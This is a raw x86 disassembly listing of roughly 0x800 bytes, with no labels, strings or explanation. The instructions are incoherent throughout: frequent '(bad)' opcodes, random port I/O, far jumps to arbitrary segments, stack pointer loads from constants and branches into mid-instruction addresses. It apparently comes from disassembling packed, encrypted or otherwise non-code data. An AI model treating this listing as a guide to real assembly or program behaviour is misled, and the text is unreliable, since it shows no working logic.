  4194cc:	xor    al,BYTE PTR [eax+0x57]
  4194cf:	retf   
  4194d0:	mov    al,bl
  4194d2:	mov    ds:0x88be0e3b,eax
  4194d7:	dec    edi
  4194d8:	lea    di,[edx*4+0x294b749d]
  4194e0:	xor    dh,dl
  4194e2:	mov    ds:0x3434d5d5,al
  4194e7:	inc    ebp
  4194e8:	mov    cl,0xd4
  4194ea:	out    dx,al
  4194eb:	scas   eax,DWORD PTR es:[edi]
  4194ec:	mov    al,ds:0xa596cd3e
  4194f1:	mov    esi,0x128f2e01
  4194f6:	sub    al,0xc4
  4194f8:	adc    BYTE PTR [ebx-0x80],0xd0
  4194fc:	push   ecx
  4194fd:	shl    BYTE PTR [ebp-0x51],cl
  419500:	push   es
  419501:	leave  
  419502:	xchg   esi,eax
  419503:	dec    eax
  419504:	mov    esp,0x2acdd7a6
  419509:	sub    bh,bl
  41950b:	jno    0x419503
  41950d:	stos   DWORD PTR es:[edi],eax
  41950e:	pop    edi
  41950f:	adc    BYTE PTR [edi],ch
  419511:	fnstcw WORD PTR [edx-0x7e]
  419514:	jmp    0xce47:0x1f19c20e
  41951b:	ret    
  41951c:	mov    al,ds:0xfc5a2399
  419521:	inc    esp
  419522:	rep ins DWORD PTR es:[edi],dx
  419524:	cmp    DWORD PTR [ebx-0x283c3ead],ecx
  41952a:	rcr    ecx,1
  41952c:	and    ch,BYTE PTR [eax-0x472611b7]
  419532:	lods   al,BYTE PTR ds:[esi]
  419533:	fimul  DWORD PTR [edi+edx*2+0x1a5b4a42]
  41953a:	jns    0x41959b
  41953c:	xchg   ebp,eax
  41953d:	test   al,0xbf
  41953f:	lahf   
  419540:	test   eax,0xb770e4a9
  419545:	mov    ebx,0xa996ed83
  41954a:	and    eax,0x41a4ff21
  41954f:	das    
  419550:	adc    DWORD PTR [esi],edx
  419552:	test   BYTE PTR [eax],dh
  419554:	mov    eax,ds:0x4adf6b6f
  419559:	mov    BYTE PTR [edi+esi*2-0x17],cl
  41955d:	mov    al,ds:0x26f5ad6b
  419562:	jno    0x4195d9
  419564:	mov    es,WORD PTR [esi-0x36]
  419567:	sbb    DWORD PTR ds:[eax+0x157df81a],esi
  41956e:	pop    edi
  41956f:	clc    
  419570:	call   0x2b0b104f
  419575:	mov    edx,0x96de484a
  41957a:	shl    DWORD PTR [ebp+eiz*1-0x15dcf467],1
  419581:	mov    edi,0x81d5a91f
  419586:	mov    edx,0xe7ec5733
  41958b:	out    0x69,al
  41958d:	push   edi
  41958e:	loop   0x41951f
  419590:	mov    edx,DWORD PTR [eax+edi*2]
  419593:	adc    eax,0x27839292
  419598:	mov    al,ds:0x7d18357a
  41959d:	add    eax,0x8b47eefd
  4195a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195a3:	std    
  4195a4:	mov    cl,0x98
  4195a6:	jmp    0xbe4b5b83
  4195ab:	ins    DWORD PTR es:[edi],dx
  4195ac:	sar    BYTE PTR [eax],1
  4195ae:	or     al,0x75
  4195b0:	ins    DWORD PTR es:[edi],dx
  4195b1:	neg    DWORD PTR [edi-0x20e5d664]
  4195b7:	sbb    esp,0x68
  4195ba:	stos   DWORD PTR es:[edi],eax
  4195bb:	mov    ch,0xf
  4195bd:	es leave 
  4195bf:	cld    
  4195c0:	repz jg 0x4195e0
  4195c3:	lds    eax,FWORD PTR [edi-0x4ffecab6]
  4195c9:	pop    ss
  4195ca:	mov    dl,0x88
  4195cc:	mov    esi,0x982a4187
  4195d1:	aas    
  4195d2:	stos   BYTE PTR es:[edi],al
  4195d3:	hlt    
  4195d4:	(bad)  
  4195d5:	retf   
  4195d6:	fdivr  DWORD PTR [edi+0x7e3d053e]
  4195dc:	aad    0xf1
  4195de:	or     al,0x9b
  4195e0:	pop    esp
  4195e1:	xchg   bh,bl
  4195e3:	test   al,0x6e
  4195e5:	push   edx
  4195e6:	jmp    0xee06a48f
  4195eb:	out    dx,eax
  4195ec:	arpl   bx,ax
  4195ee:	into   
  4195ef:	stos   BYTE PTR es:[edi],al
  4195f0:	lods   eax,DWORD PTR ss:[esi]
  4195f2:	not    BYTE PTR [eax+ecx*2]
  4195f5:	sbb    ebp,esi
  4195f7:	and    ch,BYTE PTR [eax]
  4195f9:	xchg   esi,ebx
  4195fb:	xchg   BYTE PTR [edi+0x61c2154],cl
  419601:	mov    edi,0xbded3271
  419606:	jecxz  0x419643
  419608:	mov    ds:0x9ff1b293,eax
  41960d:	mov    DWORD PTR [ebp-0x3d],ebx
  419610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419611:	jno    0x41962d
  419613:	cmpps  xmm6,XMMWORD PTR [esp+edi*4+0x237f5b31],0x99
  41961c:	cmp    bl,BYTE PTR [edx]
  41961e:	push   es
  41961f:	jge    0x41962f
  419621:	jg     0x419644
  419623:	lea    edx,[edx]
  419625:	dec    eax
  419626:	jg     0x419682
  419628:	pusha  
  419629:	sbb    DWORD PTR [edi-0x7cee2ce],edx
  41962f:	neg    DWORD PTR [edx]
  419631:	inc    ebx
  419632:	xchg   BYTE PTR ds:[esi],ch
  419635:	mov    ds:0x5e505e4,al
  41963a:	loope  0x41963b
  41963c:	fsubr  st,st(4)
  41963e:	push   es
  41963f:	mov    edx,DWORD PTR [ecx-0x2a]
  419642:	je     0x4195e9
  419644:	sub    BYTE PTR [eax+0x3f07810],bl
  41964a:	ins    DWORD PTR es:[edi],dx
  41964b:	loope  0x419699
  41964d:	ficomp WORD PTR ds:0xa51e644
  419653:	jbe    0x41967a
  419655:	popa   
  419656:	aas    
  419657:	into   
  419658:	retf   
  419659:	out    0x83,al
  41965b:	fs xor esi,ecx
  41965e:	add    esp,DWORD PTR [edx]
  419660:	(bad)  
  419661:	cmp    al,BYTE PTR [edx+eiz*8]
  419664:	sbb    eax,0x84dbfdc3
  419669:	out    dx,al
  41966a:	out    dx,eax
  41966b:	mov    cs,WORD PTR [ebp+0x32c56aa0]
  419671:	sub    ch,BYTE PTR [ecx]
  419673:	call   FWORD PTR [ecx+edx*2]
  419676:	outs   dx,DWORD PTR ds:[esi]
  419677:	fidiv  WORD PTR [ecx]
  419679:	pushf  
  41967a:	int3   
  41967b:	scas   eax,DWORD PTR es:[edi]
  41967c:	ret    0xb408
  41967f:	add    eax,eax
  419681:	jne    0x4196ba
  419683:	shr    ah,0xc5
  419686:	jno    0x4196b1
  419688:	pop    edx
  419689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41968a:	dec    ebp
  41968b:	scas   eax,DWORD PTR es:[edi]
  41968c:	out    dx,al
  41968d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41968e:	mov    al,0x68
  419690:	stc    
  419691:	popa   
  419692:	inc    ecx
  419693:	cli    
  419694:	addr16 test eax,0x18f4ae30
  41969a:	cmp    DWORD PTR [esi+0x7f5177d4],edi
  4196a0:	dec    edx
  4196a1:	inc    esp
  4196a2:	hlt    
  4196a3:	push   esi
  4196a4:	mov    ecx,0xb1b79022
  4196a9:	and    eax,0x4f60a21f
  4196ae:	arpl   WORD PTR [edi-0x32],di
  4196b1:	add    esp,ebp
  4196b3:	sbb    BYTE PTR [esi-0x1e3fdbdd],al
  4196b9:	or     DWORD PTR [esi-0x59],ebx
  4196bc:	enter  0x7c6c,0x26
  4196c0:	sbb    BYTE PTR ds:0x17a9e389,dh
  4196c6:	adc    bl,ch
  4196c8:	leave  
  4196c9:	xor    DWORD PTR [ecx],ebp
  4196cb:	stos   BYTE PTR es:[edi],al
  4196cc:	mov    ?,WORD PTR [ecx+0x56ad72e4]
  4196d2:	jne    0x419743
  4196d4:	sub    DWORD PTR [esi-0xf959ea2],ebx
  4196da:	scas   eax,DWORD PTR es:[edi]
  4196db:	xor    ecx,eax
  4196dd:	(bad)  
  4196de:	out    dx,al
  4196df:	xchg   ecx,eax
  4196e0:	cmc    
  4196e1:	pop    esi
  4196e2:	popa   
  4196e3:	div    BYTE PTR [ebp-0x5d09d218]
  4196e9:	push   ebp
  4196ea:	mov    edx,0xe68074c4
  4196ef:	inc    ebx
  4196f0:	inc    edx
  4196f1:	fldenv [edi-0x1b25e034]
  4196f7:	jge    0x419745
  4196f9:	jl     0x419697
  4196fb:	push   esi
  4196fc:	test   eax,0x98240512
  419701:	mov    esp,0x838cd979
  419706:	into   
  419707:	ret    
  419708:	fild   QWORD PTR [ebx-0x6b]
  41970b:	data16 jge 0x4196d0
  41970e:	or     al,0xe6
  419710:	test   eax,0xd0f377d2
  419715:	shr    DWORD PTR [ecx-0x61e52224],1
  41971b:	ja     0x4196c4
  41971d:	in     eax,0xe9
  41971f:	ins    DWORD PTR es:[edi],dx
  419720:	sbb    DWORD PTR [edi],edi
  419722:	mov    esp,0x92dbfe57
  419727:	pushf  
  419728:	test   eax,0xa3ec873e
  41972d:	xchg   BYTE PTR [edi],ch
  41972f:	ins    BYTE PTR es:[edi],dx
  419730:	imul   ebp,DWORD PTR [esi],0x6817ffe9
  419736:	shl    DWORD PTR [ebx+edx*8-0x1948b83e],0xa4
  41973e:	push   0x37
  419740:	xor    al,0x31
  419742:	dec    esi
  419743:	jecxz  0x419730
  419745:	xor    al,0x4e
  419747:	push   es
  419748:	lods   eax,DWORD PTR ds:[esi]
  419749:	pop    esp
  41974a:	mov    WORD PTR [ebx+0x5a908782],?
  419750:	xchg   BYTE PTR [ebx],bl
  419752:	lahf   
  419753:	and    eax,0xf1745895
  419758:	sbb    bh,BYTE PTR [edx-0x4a]
  41975b:	(bad)  
  41975c:	jle    0x4196ec
  41975e:	shr    ah,cl
  419760:	clc    
  419761:	push   ss
  419762:	mov    ds:0x6bb9fb10,al
  419767:	js     0x419760
  419769:	pop    ecx
  41976a:	inc    eax
  41976b:	adc    bh,al
  41976d:	popa   
  41976e:	sbb    BYTE PTR [ebp+0x7724f36f],dh
  419774:	nop
  419775:	repnz popa 
  419777:	or     al,0xdd
  419779:	xor    edi,edi
  41977b:	pop    ss
  41977c:	inc    eax
  41977d:	popa   
  41977e:	sub    ebp,DWORD PTR [edx]
  419780:	call   0x1481:0xd5aa6941
  419787:	push   ecx
  419788:	pop    ebx
  419789:	les    esp,FWORD PTR [ecx]
  41978b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41978c:	mov    ah,0x56
  41978e:	xchg   edx,eax
  41978f:	test   BYTE PTR [esi-0x2a526ddc],bh
  419795:	cmp    al,BYTE PTR [ebx+0x40]
  419798:	dec    edi
  419799:	adc    al,0x32
  41979b:	xor    dh,dl
  41979d:	mov    bl,dl
  41979f:	sbb    al,0x6a
  4197a1:	pop    ecx
  4197a2:	lock add DWORD PTR [eax],ebp
  4197a5:	(bad)  
  4197a6:	mov    esi,0x2a257689
  4197ab:	push   eax
  4197ac:	fidiv  DWORD PTR [edi+0x7c]
  4197af:	(bad)  
  4197b0:	mov    edx,0x19af9f62
  4197b5:	mov    dh,0x7e
  4197b7:	sub    al,0x8f
  4197b9:	jg     0x419818
  4197bb:	or     ebx,DWORD PTR [ebx]
  4197bd:	xor    edi,esp
  4197bf:	je     0x419829
  4197c1:	add    al,0xa3
  4197c3:	fs and cl,dh
  4197c6:	xchg   esi,eax
  4197c7:	or     ecx,0x2a5cb4a9
  4197cd:	cli    
  4197ce:	retf   0x3955
  4197d1:	cmp    ebp,DWORD PTR [ecx]
  4197d3:	mov    ebx,0xc49fc17f
  4197d8:	xchg   DWORD PTR [ebp+0x62],esi
  4197db:	pop    edi
  4197dc:	outs   dx,BYTE PTR ds:[esi]
  4197dd:	sar    BYTE PTR [eax-0x41],1
  4197e0:	bound  ebp,QWORD PTR [edi+0x49]
  4197e3:	popf   
  4197e4:	out    dx,eax
  4197e5:	nop
  4197e6:	sbb    bh,BYTE PTR [edi-0x16f1abdc]
  4197ec:	sub    esp,DWORD PTR ds:0xd09de91a
  4197f2:	(bad)  
  4197f3:	cmp    BYTE PTR [eax+eax*4+0x7aba502c],bh
  4197fa:	mov    bl,0x8f
  4197fc:	leave  
  4197fd:	repnz adc eax,DWORD PTR [eax-0x28]
  419801:	cs mov ebp,fs
  419804:	rcl    BYTE PTR [esi+eiz*8],cl
  419807:	jno    0x419810
  419809:	pusha  
  41980a:	and    eax,0x6578a8e6
  41980f:	push   cs
  419810:	sub    BYTE PTR [ecx],ch
  419812:	imul   BYTE PTR [eax]
  419814:	out    dx,al
  419815:	xor    dh,BYTE PTR [edx-0x4c]
  419818:	cs push 0xffffff84
  41981b:	div    DWORD PTR [edx-0xd]
  41981e:	push   esp
  41981f:	out    0x30,eax
  419821:	scas   eax,DWORD PTR es:[edi]
  419822:	aam    0x5f
  419824:	inc    esp
  419825:	pop    es
  419826:	pushf  
  419827:	and    bl,BYTE PTR ds:0x57a1c1d0
  41982d:	cmp    DWORD PTR [edi],ebp
  41982f:	push   esp
  419830:	sub    ah,BYTE PTR [edi-0x61]
  419833:	sub    eax,0x9a4e8cbf
  419838:	mov    bh,0x5d
  41983a:	bnd call 0x69e550d0
  419840:	stc    
  419841:	or     al,0x6
  419843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419844:	retf   0x6eca
  419847:	jns    0x4198b9
  419849:	cmp    eax,edi
  41984b:	lahf   
  41984c:	pop    ds
  41984d:	repnz dec ebx
  41984f:	int3   
  419850:	xchg   ecx,eax
  419851:	mov    ds:0xe42b99f5,eax
  419856:	add    bl,BYTE PTR [ecx]
  419858:	push   esp
  419859:	mov    esi,0xf6d97031
  41985e:	cmp    BYTE PTR [ecx],al
  419860:	cld    
  419861:	and    esi,DWORD PTR [edi]
  419863:	jge    0x419805
  419865:	sbb    cl,BYTE PTR [edx-0x2d]
  419868:	push   0xe5e007ad
  41986d:	iret   
  41986e:	xor    al,0x10
  419870:	ds or  eax,0x98e9b540
  419876:	(bad)  
  419877:	fwait
  419878:	in     al,dx
  419879:	in     eax,0xa2
  41987b:	jp     0x419832
  41987d:	inc    edi
  41987e:	mov    dh,0x29
  419880:	adc    al,bh
  419882:	mov    cl,0x29
  419884:	push   esp
  419885:	mov    dh,0xf3
  419887:	jg     0x41989b
  419889:	jecxz  0x419878
  41988b:	adc    al,0xe0
  41988d:	mov    al,ds:0xee20a7b2
  419892:	cs push es
  419894:	ficomp DWORD PTR ds:0x264ffb09
  41989a:	xor    dh,BYTE PTR [ebx+0x1ab563f3]
  4198a0:	sub    eax,0x6a3a5d87
  4198a5:	(bad)  
  4198a6:	dec    edi
  4198a7:	or     BYTE PTR [eax+0x24a1101e],bh
  4198ad:	jp     0x419855
  4198af:	and    BYTE PTR [edi],al
  4198b1:	retf   
  4198b2:	jae    0x419910
  4198b4:	aas    
  4198b5:	adc    eax,0x5661bccf
  4198ba:	test   BYTE PTR [ebx-0x61baa56e],al
  4198c0:	aas    
  4198c1:	dec    edi
  4198c2:	nop
  4198c3:	pop    ds
  4198c4:	dec    esi
  4198c5:	mov    dh,0x21
  4198c7:	dec    edi
  4198c8:	out    dx,al
  4198c9:	add    eax,0x120cfb5c
  4198ce:	mov    eax,ds:0xa8bb7697
  4198d3:	adc    DWORD PTR [eax],ecx
  4198d5:	mov    dh,0xe2
  4198d7:	add    cl,BYTE PTR [ebp+0x43]
  4198da:	js     0x41990c
  4198dc:	(bad)  
  4198dd:	aam    0xf0
  4198df:	cmp    cl,cl
  4198e1:	fidivr WORD PTR [ebx]
  4198e3:	or     al,0xa7
  4198e5:	fild   WORD PTR [edx]
  4198e7:	ret    
  4198e8:	mov    ebp,0xed04be06
  4198ed:	or     eax,DWORD PTR [esi-0x4]
  4198f0:	push   es
  4198f1:	rcr    DWORD PTR [ebx],cl
  4198f3:	mov    ch,BYTE PTR [ecx-0xb]
  4198f6:	je     0x419930
  4198f8:	push   edi
  4198f9:	mov    ebp,0x510d3058
  4198fe:	mov    ds:0xb89406f7,al
  419903:	gs pop es
  419905:	rcr    DWORD PTR [esi+0x34],0x70
  419909:	push   cs
  41990a:	loopne 0x4198d4
  41990c:	sbb    ebp,DWORD PTR [esi-0x6a]
  41990f:	fucomi st,st(1)
  419911:	test   DWORD PTR [ebx],esi
  419913:	arpl   sp,ax
  419915:	retf   0x58ec
  419918:	nop
  419919:	cld    
  41991a:	adc    ch,BYTE PTR [ebp-0x4d]
  41991d:	mov    esp,0x5d405002
  419922:	ret    0x188b
  419925:	dec    eax
  419926:	mov    esp,DWORD PTR [edi+esi*2+0x3]
  41992a:	ret    
  41992b:	mov    al,0xf9
  41992d:	or     al,0x9a
  41992f:	adc    bl,BYTE PTR [ebp+esi*4+0x36]
  419933:	scas   eax,DWORD PTR es:[edi]
  419934:	pop    ds
  419935:	and    edx,ebx
  419937:	jmp    0xea9e:0xd716356
  41993e:	sbb    al,0x43
  419940:	enter  0x1cbe,0x1b
  419944:	aad    0xf7
  419946:	in     eax,0x71
  419948:	mov    ecx,0xf08b1662
  41994d:	daa    
  41994e:	or     ebx,ebp
  419950:	aad    0x79
  419952:	(bad)  
  419953:	daa    
  419954:	fldenv [esi+0x4d]
  419957:	arpl   WORD PTR [edx+0xf],di
  41995a:	call   0x1dbd5109
  41995f:	xor    al,0x32
  419961:	jae    0x419985
  419963:	mov    ds:0xd197853b,al
  419968:	push   0x6f
  41996a:	imul   esp,DWORD PTR [edx+esi*1-0x57],0x50
  41996f:	xchg   esi,eax
  419970:	cmp    eax,DWORD PTR [eax+0x77254367]
  419976:	and    DWORD PTR [edx-0x35ebda6a],ebp
  41997c:	test   DWORD PTR [esi],0x3564af00
  419982:	mov    cl,BYTE PTR [edi]
  419984:	in     al,dx
  419985:	aaa    
  419986:	mov    bl,0x7c
  419988:	xor    esp,DWORD PTR [edi+0x628b6921]
  41998e:	addr16 pop ebx
  419990:	add    BYTE PTR [eax-0x44cdf4a6],dh
  419996:	ins    BYTE PTR es:[edi],dx
  419997:	sub    BYTE PTR [ecx+esi*2],ch
  41999a:	push   ebp
  41999b:	pop    ebp
  41999c:	xchg   ebp,eax
  41999d:	ins    DWORD PTR es:[edi],dx
  41999e:	call   0x28f:0x3c99773b
  4199a5:	js     0x4199a6
  4199a7:	adc    BYTE PTR [edx-0x7c],bh
  4199aa:	mov    al,0x21
  4199ac:	out    0xea,eax
  4199ae:	lahf   
  4199af:	push   esi
  4199b0:	in     eax,0x86
  4199b2:	dec    esi
  4199b3:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4199b5:	xchg   edi,eax
  4199b6:	inc    edx
  4199b7:	mov    esi,0xf8d3c4e
  4199bc:	repz push ecx
  4199be:	aad    0x1f
  4199c0:	outs   dx,DWORD PTR ds:[esi]
  4199c1:	sahf   
  4199c2:	ror    bh,cl
  4199c4:	jle    0x419965
  4199c6:	ins    BYTE PTR es:[edi],dx
  4199c7:	add    DWORD PTR [ebx+ebp*8+0x56f6a7a1],esi
  4199ce:	or     ebx,DWORD PTR [eax+0x293ff15c]
  4199d4:	into   
  4199d5:	leave  
  4199d6:	jb     0x41996e
  4199d8:	push   0x75708dad
  4199dd:	xchg   edx,eax
  4199de:	arpl   WORD PTR [ecx],ax
  4199e0:	mov    ?,WORD PTR [ebx]
  4199e2:	pop    ebp
  4199e3:	sahf   
  4199e4:	mov    ch,0xe
  4199e6:	inc    edi
  4199e7:	mov    ch,0xd1
  4199e9:	mov    esi,0xf0c091d3
  4199ee:	sti    
  4199ef:	call   0xaf542b52
  4199f4:	adc    BYTE PTR [edi],cl
  4199f6:	mov    cl,dl
  4199f8:	xchg   edx,eax
  4199f9:	xchg   esi,eax
  4199fa:	inc    esp
  4199fb:	in     eax,0x80
  4199fd:	xchg   esi,eax
  4199fe:	pop    ss
  4199ff:	test   BYTE PTR [edx+0x79fc1463],dl
  419a05:	push   ds
  419a06:	and    BYTE PTR ds:0xc9751e78,dl
  419a0c:	les    eax,FWORD PTR [esi]
  419a0e:	mov    bh,0xc7
  419a10:	inc    ebx
  419a11:	out    dx,eax
  419a12:	dec    eax
  419a13:	inc    esi
  419a14:	dec    eax
  419a15:	sub    eax,DWORD PTR [eax]
  419a17:	sub    esi,DWORD PTR [edi-0x332f8dc]
  419a1d:	and    esi,DWORD PTR [ebp-0x17]
  419a20:	addr16 loopne 0x419a45
  419a23:	je     0x419a73
  419a25:	xor    BYTE PTR [ecx+0x73cf33a9],dl
  419a2b:	pop    esp
  419a2c:	(bad)  gs:0x1bbb0d9a
  419a33:	shr    DWORD PTR [edx+eiz*1-0x72],1
  419a37:	mov    cl,0x98
  419a39:	or     DWORD PTR [ebx],eax
  419a3b:	ds test eax,0xd64a7380
  419a41:	aaa    
  419a42:	xor    al,bh
  419a44:	jmp    0x419a6c
  419a46:	and    esp,DWORD PTR [esi+0x18eeb8bd]
  419a4c:	adc    BYTE PTR [esi+0x5f],ch
  419a4f:	mov    ebx,DWORD PTR [eax+0x6cea6c86]
  419a55:	inc    ebx
  419a56:	xchg   ecx,eax
  419a57:	sti    
  419a58:	shl    ah,0x2a
  419a5b:	dec    esp
  419a5c:	rcl    DWORD PTR [eax+0x17],cl
  419a5f:	pushf  
  419a60:	rol    DWORD PTR [ebx-0x68],0xc6
  419a64:	pop    ss
  419a65:	cwde   
  419a66:	mov    edx,0xeb2510d5
  419a6b:	ins    BYTE PTR es:[edi],dx
  419a6c:	sbb    ecx,DWORD PTR [esi+0x2d9b323a]
  419a72:	std    
  419a73:	pop    ebx
  419a74:	mov    BYTE PTR gs:[esi],bh
  419a77:	lea    ebx,[ecx]
  419a79:	push   ebp
  419a7a:	sub    ebx,DWORD PTR ds:0xf6d3acf9
  419a80:	pop    edx
  419a81:	(bad)  
  419a82:	ins    BYTE PTR es:[edi],dx
  419a83:	(bad)  
  419a84:	xchg   ebx,eax
  419a85:	adc    BYTE PTR [ecx+0x101d0191],bh
  419a8b:	mov    ds:0xe7a85695,eax
  419a90:	jnp    0x419a92
  419a92:	xchg   esi,eax
  419a93:	dec    edi
  419a94:	push   ebp
  419a95:	bound  ecx,QWORD PTR [ecx]
  419a97:	sub    eax,0x91de7c67
  419a9c:	pop    ss
  419a9d:	test   ebx,edx
  419a9f:	push   esp
  419aa0:	push   cs
  419aa1:	or     al,0x41
  419aa3:	jne    0x419aa6
  419aa5:	nop
  419aa6:	pop    ecx
  419aa7:	xor    DWORD PTR [ebx],edx
  419aa9:	test   al,0x37
  419aab:	and    DWORD PTR [esi+0x4a4206b9],0x74f109f
  419ab5:	repnz mov esp,0xa2fb6bad
  419abb:	ds fs wbinvd 
  419abf:	iret   
  419ac0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ac2:	arpl   WORD PTR [edx-0x1e1ef7ee],dx
  419ac8:	loope  0x419ada
  419aca:	shl    BYTE PTR [ebp-0x7c],1
  419acd:	add    BYTE PTR [eax],al
  419acf:	push   edi
  419ad0:	xchg   ebp,eax
  419ad1:	pop    edi
  419ad2:	in     eax,0x48
  419ad4:	repz lahf 
  419ad6:	adc    ah,0xc2
  419ad9:	sub    edx,DWORD PTR ds:[edi]
  419adc:	ror    al,cl
  419ade:	dec    ebx
  419adf:	dec    eax
  419ae0:	int    0x40
  419ae2:	xlat   BYTE PTR ds:[ebx]
  419ae3:	popf   
  419ae4:	push   es
  419ae5:	and    al,0xd
  419ae7:	add    eax,0x26d8c92c
  419aec:	fwait
  419aed:	int3   
  419aee:	test   BYTE PTR [edx-0x41],dh
  419af1:	shr    BYTE PTR [eax+esi*2-0x7c],cl
  419af5:	mov    dh,0x59
  419af7:	mov    eax,ds:0xa1289df9
  419afc:	test   al,0xec
  419afe:	sub    eax,0xb11ccf30
  419b03:	js     0x419b1e
  419b05:	outs   dx,BYTE PTR ds:[esi]
  419b06:	pop    ss
  419b07:	lea    ecx,ds:0x800595f4
  419b0d:	fs push edi
  419b0f:	retf   
  419b10:	xchg   esi,eax
  419b11:	jbe    0x419b2e
  419b13:	mov    ds:0xd36ac9fe,eax
  419b18:	test   al,0x43
  419b1a:	mov    eax,ds:0x6e88f69c
  419b1f:	sahf   
  419b20:	fldenv [ebx]
  419b22:	retf   
  419b23:	cmp    BYTE PTR [ebx+0x514fce75],0xaa
  419b2a:	or     eax,0xce12de12
  419b2f:	adc    eax,DWORD PTR [eax]
  419b31:	aaa    
  419b32:	dec    ebx
  419b33:	mov    edi,0x6159bd7
  419b38:	ins    BYTE PTR es:[edi],dx
  419b39:	dec    esi
  419b3a:	dec    ebp
  419b3b:	stos   BYTE PTR es:[edi],al
  419b3c:	inc    ebx
  419b3d:	dec    eax
  419b3e:	and    eax,0x3a881bfd
  419b44:	mov    edx,0x59c48247
  419b49:	or     ah,BYTE PTR [ebp-0x4483dbda]
  419b4f:	adc    ecx,esp
  419b51:	jp     0x419b66
  419b53:	jg     0x419b21
  419b55:	lods   eax,DWORD PTR ds:[esi]
  419b56:	mov    al,ds:0x75deedc0
  419b5b:	aad    0x9e
  419b5d:	xlat   BYTE PTR ds:[ebx]
  419b5e:	cmp    esi,esi
  419b60:	leave  
  419b61:	pushf  
  419b62:	mov    eax,0x395c52e5
  419b67:	outs   dx,BYTE PTR ds:[esi]
  419b68:	aas    
  419b69:	fmul   st(0),st
  419b6b:	(bad)  
  419b6c:	in     al,dx
  419b6d:	xor    BYTE PTR [ecx+0x4f],0xd2
  419b71:	or     DWORD PTR [ecx+0x966f9d7],ebp
  419b77:	sub    bh,BYTE PTR [esi+0x126b5d3a]
  419b7d:	adc    BYTE PTR [edi+eax*8],ch
  419b80:	add    eax,0xf19c548f
  419b85:	or     ecx,0x29
  419b88:	out    0xc,al
  419b8a:	ds sub eax,0x16a9cc97
  419b90:	jg     0x419b5d
  419b92:	pop    sp
  419b94:	popf   
  419b95:	push   edx
  419b96:	mov    fs,WORD PTR [ecx+ebp*8-0x7d]
  419b9a:	cmp    dl,BYTE PTR [ebp+0x2b97fbe5]
  419ba0:	push   0xe88a8a42
  419ba5:	push   ebp
  419ba6:	jb     0x419bb2
  419ba8:	xor    al,BYTE PTR [esi]
  419baa:	(bad)  
  419bab:	fisttp WORD PTR [ecx+0x39]
  419bae:	sub    dh,BYTE PTR [ebx-0x79323bcb]
  419bb4:	retf   
  419bb5:	and    al,0x6e
  419bb7:	arpl   WORD PTR [ebx],dx
  419bb9:	fwait
  419bba:	xor    BYTE PTR [edi+edx*2],dl
  419bbd:	(bad)  
  419bbe:	out    dx,al
  419bbf:	mov    esp,edi
  419bc1:	or     ecx,DWORD PTR [ebx-0x4a]
  419bc4:	fld    TBYTE PTR [esi+eax*2-0x32]
  419bc8:	js     0x419b55
  419bca:	icebp  
  419bcb:	aas    
  419bcc:	push   esp
  419bcd:	push   eax
  419bce:	pop    eax
  419bcf:	shl    BYTE PTR [ebx],cl
  419bd1:	les    ecx,FWORD PTR [edi-0x1f4e7d65]
  419bd7:	xor    dl,BYTE PTR [esi+0x38]
  419bda:	xchg   esp,eax
  419bdb:	xchg   DWORD PTR [eax],esi
  419bdd:	mov    ah,0x45
  419bdf:	sub    DWORD PTR [ebx+0x2e7a8968],esi
  419be5:	add    cl,ah
  419be7:	sbb    BYTE PTR [esi],0x8a
  419bea:	aad    0x96
  419bec:	das    
  419bed:	enter  0x8c5c,0xb4
  419bf1:	jg     0x419bf0
  419bf3:	xor    BYTE PTR [eax+0x1e46b484],dl
  419bf9:	dec    ecx
  419bfa:	xlat   BYTE PTR ds:[ebx]
  419bfb:	xchg   BYTE PTR [ecx],ah
  419bfd:	dec    esi
  419bfe:	add    al,0x47
  419c00:	push   es
  419c01:	pop    ss
  419c02:	ret    0x18d7
  419c05:	cdq    
  419c06:	jg     0x419bec
  419c08:	stc    
  419c09:	dec    eax
  419c0a:	cmp    al,0x4c
  419c0c:	cli    
  419c0d:	dec    esi
  419c0e:	clc    
  419c0f:	xor    eax,ebx
  419c11:	mov    ecx,ebp
  419c13:	push   edi
  419c14:	inc    esi
  419c15:	stc    
  419c16:	shl    DWORD PTR [esi+0x7e4efe9c],cl
  419c1c:	adc    eax,ecx
  419c1e:	mov    fs,WORD PTR [esi]
  419c20:	test   DWORD PTR [bx+si],edi
  419c23:	push   ss
  419c24:	pushf  
  419c25:	and    bh,BYTE PTR [ecx+0x6f]
  419c28:	jae    0x419c94
  419c2a:	jo     0x419bc5
  419c2c:	add    bl,dl
  419c2e:	mov    esp,0x1b0fbca7
  419c33:	xor    dl,BYTE PTR [esi+0x3f2337e8]
  419c39:	pusha  
  419c3a:	rcr    BYTE PTR [edi],0xfa
  419c3d:	fwait
  419c3e:	xchg   edx,eax
  419c3f:	loope  0x419bc5
  419c41:	in     al,dx
  419c42:	mov    edi,DWORD PTR [ebp+0x72eaf11e]
  419c48:	mov    edx,0x18018296
  419c4d:	inc    esi
  419c4e:	cmp    al,0x1a
  419c50:	jb     0x419c11
  419c52:	sbb    bl,cl
  419c54:	(bad)  
  419c55:	mov    al,ds:0x9b74e985
  419c5a:	jmp    0x7fdb:0xcd5d5ee3
  419c61:	aas    
  419c62:	jge    0x419c0d
  419c64:	sub    DWORD PTR [ebx+0x70919f5e],esi
  419c6a:	push   0xc4539586
  419c6f:	mov    ah,0xfb
  419c71:	out    dx,al
  419c72:	sbb    al,0x19
  419c74:	pop    edx
  419c75:	lea    ebp,[edx]
  419c77:	dec    ebp
  419c78:	sbb    eax,0x6b50d80a
  419c7d:	into   
  419c7e:	mov    al,ds:0x151dad6b
  419c83:	mov    esi,0xe8d934ed
  419c88:	nop
  419c89:	jno    0x419ca7
  419c8b:	jne    0x419c38
  419c8d:	(bad)  
  419c8e:	mov    esp,0x5e92acb9
  419c93:	xchg   esp,eax
  419c94:	popa   
  419c95:	repz inc edi
  419c97:	out    0x3a,eax
  419c99:	(bad)
  419c9c:	jle    0x419cdb
  419c9e:	(bad)  
  419c9f:	adc    ch,BYTE PTR [edx-0x4]
  419ca2:	sub    dl,BYTE PTR [edi]
